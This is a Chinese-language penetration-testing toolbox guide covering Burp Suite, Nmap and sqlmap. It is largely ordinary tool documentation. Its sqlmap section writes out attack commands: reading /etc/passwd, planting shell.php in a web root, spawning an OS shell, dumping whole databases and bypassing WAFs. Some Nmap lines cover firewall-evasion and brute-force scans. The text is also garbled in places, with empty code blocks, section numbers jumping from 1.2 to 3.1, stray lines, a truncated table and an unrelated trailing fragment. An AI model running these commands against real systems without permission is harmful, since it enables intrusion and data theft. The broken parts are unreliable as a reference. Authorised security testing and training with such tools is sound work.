# 安全工具箱配置指南

本文档详细介绍网络安全渗透测试所需的核心工具安装与配置，涵盖渗透测试、信息收集、漏洞利用、代码审计、内网渗透等多个领域的工具。

## 一、渗透测试工具

### 1.1 Burp Suite

Burp Suite是Web应用程序渗透测试的集成平台，是每个安全从业者的必备工具。

#### 1.1.1 安装与激活

**下载地址**
- 官方网站：https://portswigger.net/burp/releases
- 推荐版本：Burp Suite Professional（专业版）

**安装步骤（Linux）**

```bash
# 下载安装包
wget https://portswigger.net/burp/releases/download?product=pro&version=2024.1&type=Linux -O burpsuite_pro_linux.sh

# 赋予执行权限
chmod +x burpsuite_pro_linux.sh

# 运行安装
./burpsuite_pro_linux.sh
```

**激活步骤**
1. 启动Burp Suite
2. 输入许可证密钥
3. 选择激活方式（在线激活或离线激活）
4. 完成激活后重启软件

#### 1.1.2 基础配置

**代理设置**

```bash
# Burp默认代理配置
Proxy Listener:
  - Binding Address: 127.0.0.1
  - Port: 8080
  - Support invisible proxying: true (用于非代理感知客户端)
```

**证书安装**

1. 浏览器访问 http://burp
2. 下载CA证书
3. 浏览器导入证书到受信任根证书颁发机构

**Firefox代理配置**

```
设置 → 网络设置 → 手动代理配置
HTTP代理: 127.0.0.1  端口: 8080
勾选"也将此代理用于HTTPS"
```

**Chrome代理配置**

```bash
# 使用SwitchyOmega扩展
# 或命令行启动
google-chrome --proxy-server="127.0.0.1:8080"
```

#### 1.1.3 核心功能详解

**Proxy（代理模块）**

- **Intercept**：拦截请求，可手动修改后转发
- **HTTP history**：记录所有经过代理的请求历史
- **WebSockets history**：WebSocket通信记录
- **Options**：代理配置选项

常用操作：
```
Ctrl+R → 发送到Repeater
Ctrl+I → 发送到Intruder
右键 → Do an active scan（主动扫描）
```

**Target（目标模块）**

- **Site map**：目标站点结构树
- **Scope**：定义测试范围，避免误操作
- **Issue definitions**：漏洞定义参考

设置测试范围：
```
Target → Site map → 右键目标 → Add to scope
Target → Scope → 配置包含/排除规则
```

**Repeater（重放模块）**

用于手动测试和调试请求：
- 支持修改任意请求参数
- 可保存请求标签页
- 支持请求历史回溯

**Intruder（入侵模块）**

四种攻击模式：

| 模式 | 说明 | 适用场景 |
|------|------|----------|
| Sniper | 单参数，逐个测试 | 单点爆破 |
| Battering ram | 单参数，同步测试 | 并行测试 |
| Pitchfork | 多参数，一一对应 | 多字段组合 |
| Cluster bomb | 多参数，笛卡尔积 | 全组合爆破 |

配置示例：
```
1. 选择攻击位置（Add §）
2. 设置Payload类型：
   - Simple list：简单列表
   - Runtime file：运行时读取文件
   - Numbers：数字序列
   - Brute forcer：暴力破解
3. 配置攻击选项（线程、超时等）
4. Start attack
```

**Decoder（解码模块）**

支持多种编码/解码：
- Base64、URL、HTML、Hex编码
- Hash计算（MD5、SHA系列）
- 自定义编码链

**Comparer（比较模块）**

用于比较两个请求或响应的差异，常用于：
- 分析认证前后的差异
- 对比不同参数的响应

**Scanner（扫描模块）**

主动扫描配置：
```
Scanner → Scan configurations
  - Audit items：选择检查项
  - Insertion points：插入点类型
  - Handling issues：问题处理
```

#### 1.1.4 插件推荐

**安装方式**
- BApp Store：Burp内置插件商店
- 手动安装：Extender → Options → Python/Java环境配置

**必备插件**

| 插件名称 | 功能说明 |
|----------|----------|
| Logger++ | 增强日志记录 |
| Turbo Intruder | 高性能爆破 |
| Autorize | 权限检测 |
| Param Miner | 参数挖掘 |
| JS Link Finder | JS链接发现 |
| Retire.js | JS库漏洞检测 |
| SQLiPy | SQL注入增强 |
| Burp-JSMiner | JS敏感信息挖掘 |

**插件开发示例（Python）**

```python

    def registerExtenderCallbacks(self, callbacks):
```

### 1.2 Nmap

Nmap是网络发现和安全审计的基石工具，功能强大且灵活。

#### 1.2.1 安装

```bash
# Kali Linux（已预装）
sudo apt install nmap

# Ubuntu/Debian
sudo apt update
sudo apt install nmap

# CentOS/RHEL
sudo yum install nmap

# macOS
brew install nmap

# Windows
# 下载安装包：https://nmap.org/download.html
```

#### 1.2.2 扫描参数详解

**基础扫描**

```bash
# TCP SYN扫描（半开连接，需root权限）
sudo nmap -sS target.com

# TCP全连接扫描
nmap -sT target.com

# UDP扫描
sudo nmap -sU target.com

# TCP ACK扫描（防火墙探测）
sudo nmap -sA target.com

# FIN/Xmas/Null扫描（防火墙绕过）
sudo nmap -sF target.com
sudo nmap -sX target.com
sudo nmap -sN target.com
```

**端口指定**

```bash
# 指定端口
nmap -p 80,443,8080 target.com

# 端口范围
nmap -p 1-1000 target.com

# 扫描所有端口
nmap -p- target.com

# 常用端口快速扫描
nmap -F target.com

# 扫描指定协议端口
nmap -sU -sT -p U:53,111,137,T:21-25,80,139,8080 target.com
```

**主机发现**

```bash
# Ping扫描（仅发现主机）
nmap -sn 192.168.1.0/24

# 跳过主机发现（直接扫描）
nmap -Pn target.com

# ARP Ping（局域网最有效）
sudo nmap -PR 192.168.1.0/24

# ICMP Echo Ping
nmap -PE target.com

# TCP SYN Ping
nmap -PS80,443 target.com

# UDP Ping
nmap -PU53 target.com
```

**服务与版本检测**

```bash
# 服务版本检测
nmap -sV target.com

# 设置版本检测强度（0-9）
nmap -sV --version-intensity 5 target.com

# 操作系统检测
sudo nmap -O target.com

# 全面检测
nmap -A target.com
```

**性能优化**

```bash
# 设置扫描速度模板
nmap -T0 target.com  # 偏执模式（极慢）
nmap -T1 target.com  # 偷袭模式
nmap -T2 target.com  # 礼貌模式
nmap -T3 target.com  # 正常模式
nmap -T4 target.com  # 激进模式
nmap -T5 target.com  # 疯狂模式（最快）

# 设置最大并发
nmap --max-parallelism 100 target.com

# 设置超时
nmap --host-timeout 30m target.com

# 设置重试次数
nmap --max-retries 3 target.com
```

**输出格式**

```bash
# 正常输出
nmap -oN output.txt target.com

# XML输出
nmap -oX output.xml target.com

# Grepable输出
nmap -oG output.gnmap target.com

# 全部格式
nmap -oA output target.com

# 详细输出
nmap -v target.com
nmap -vv target.com  # 更详细

# 显示原因
nmap --reason target.com
```

#### 1.2.3 NSE脚本引擎

Nmap Scripting Engine (NSE) 扩展了Nmap的功能。

**脚本分类**

| 类别 | 说明 | 示例脚本 |
|------|------|----------|
| auth | 认证绕过 | ftp-anon, ssh-auth-methods |
| broadcast | 广播发现 | broadcast-netbios-master-browser |
| brute | 暴力破解 | ftp-brute, ssh-brute |
| default | 默认脚本 | -sC 等效 |
| discovery | 信息发现 | smb-enum-shares |
| exploit | 漏洞利用 | vsftpd-backdoor |
| vuln | 漏洞检测 | smb-vuln-ms17-010 |
| safe | 安全扫描 | http-title, http-robots.txt |

**脚本使用**

```bash
# 默认脚本扫描
nmap -sC target.com

# 指定脚本
nmap --script=http-title target.com

# 多个脚本
nmap --script=http-title,http-headers target.com

# 脚本类别
nmap --script=vuln target.com

# 通配符
nmap --script="http-*" target.com

# 脚本参数
nmap --script=http-brute --script-args userdb=users.txt,passdb=pass.txt target.com
```

**常用脚本示例**

```bash
# SMB漏洞检测
nmap --script=smb-vuln-ms17-010 target.com

# SSH弱密钥检测
nmap --script=ssh-hostkey target.com

# Web目录枚举
nmap --script=http-enum target.com

# SSL证书检测
nmap --script=ssl-cert -p 443 target.com

# MySQL信息枚举
nmap --script=mysql-info -p 3306 target.com

# Redis未授权检测
nmap --script=redis-info -p 6379 target.com
```

**自定义NSE脚本**

```lua
-- custom_script.nse
description = "Custom Nmap script example"

categories = {"discovery", "safe"}

portrule = function(host, port)
    return port.protocol == "tcp" and port.number == 80
end

action = function(host, port)
    local result = "Custom scan result"
    return result
end
```

### 3.1 sqlmap

sqlmap是自动化SQL注入检测和利用工具。

#### 3.1.1 安装

```bash

```

#### 3.1.2 基础使用

```bash

sqlmap -u "http://target.com?id=1"

# POST请求
sqlmap -u "http://target.com/login" --data="user=admin&pass=123"

# Cookie注入
sqlmap -u "http://target.com" --cookie="id=1*"

- 指定参数
sqlmap -u "http://target.com?id=1&name=test" -p id

# 批量检测
sqlmap -m urls.txt
```

#### 3.1.3 注入类型

```bash
# 指定注入技术
sqlmap -u "http://target.com?id=1" --technique=BEUST

# B: Boolean-based blind
# E: Error-based
# U: Union query-based
# S: Stacked queries
# T: Time-based blind
```

#### 3.1.4 数据库操作

```bash
# 枚举数据库
sqlmap -u "http://target.com?id=1" --dbs

# 枚举表
sqlmap -u "http://target.com?id=1" -D database_name --tables

# 枚举列
sqlmap -u "http://target.com?id=1" -D database_name -T table_name --columns

# 获取数据
sqlmap -u "http://target.com?id=1" -D database_name -T table_name -C column1,column2 --dump

# 获取所有数据
sqlmap -u "http://target.com?id=1" --dump-all
```

#### 3.1.5 高级功能

```bash
# 指定DBMS
sqlmap -u "http://target.com?id=1" --dbms=mysql

# 指定操作系统
sqlmap -u "http://target.com?id=1" --os=linux

# 执行SQL语句
sqlmap -u "http://target.com?id=1" --sql-shell

# 读取文件
sqlmap -u "http://target.com?id=1" --file-read="/etc/passwd"

# 写入文件
sqlmap -u "http://target.com?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# 获取Shell
sqlmap -u "http://target.com?id=1" --os-shell

# 使用代理
sqlmap -u "http://target.com?id=1" --proxy="http://127.0.0.1:8080"

# 使用Tor
sqlmap -u "http://target.com?id=1" --tor

# 设置Level和Risk
sqlmap -u "http://target.com?id=1" --level=5 --risk=3
```

#### 3.1.6 绕过WAF

```bash
# 使用tamper脚本
sqlmap -u "http://target.com?id=1" --tamper=space2comment

# 多个tamper

# 查看tamper列表

```

**常用Tamper脚本**

| 脚本 | 说明 |

```ql
import python
```
